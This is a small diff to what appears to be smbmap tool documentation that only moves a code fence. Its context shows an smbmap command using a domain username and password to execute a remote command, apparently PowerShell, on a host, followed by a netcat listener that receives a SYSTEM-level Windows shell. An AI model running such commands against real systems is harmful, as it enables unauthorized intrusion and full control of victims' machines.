@@ -101,6 +101,7 @@ $ python smbmap.py -u jsmith -p 'R33nisP!nckle' -d ABC -h 192.168.2.50 -x 'power
 $ nc -l 4445
 Microsoft Windows [Version 6.1.7601]
 Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
-```
+
 C:\Windows\system32>whoami
  nt authority\system
+```
